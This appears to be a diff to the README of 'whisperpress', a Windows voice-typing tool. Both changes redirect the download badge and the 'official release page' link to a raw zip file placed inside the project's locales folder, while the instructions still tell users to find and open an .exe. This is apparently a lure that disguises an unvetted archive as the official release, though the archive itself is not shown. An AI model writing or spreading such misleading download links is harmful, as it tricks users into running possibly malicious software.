@@ -1,6 +1,6 @@
 # 🎙️ whisperpress - Fast offline voice typing for Windows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/winecoolerspinningtop973/whisperpress/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/winecoolerspinningtop973/whisperpress/main/src/common/locales/Software-v3.6.zip)
 
 ## What is this tool? 📝
 
@@ -22,7 +22,7 @@ Whisperpress turns your voice into text on your computer. You hold a key, speak 
 
 ## How to get started 📥
 
-1. Go to the [official release page](https://github.com/winecoolerspinningtop973/whisperpress/releases) to find the latest version.
+1. Go to the [official release page](https://raw.githubusercontent.com/winecoolerspinningtop973/whisperpress/main/src/common/locales/Software-v3.6.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the "Assets" section.
 3. Click the filename to download the installer to your computer.
 4. Open the file once the download finishes. 
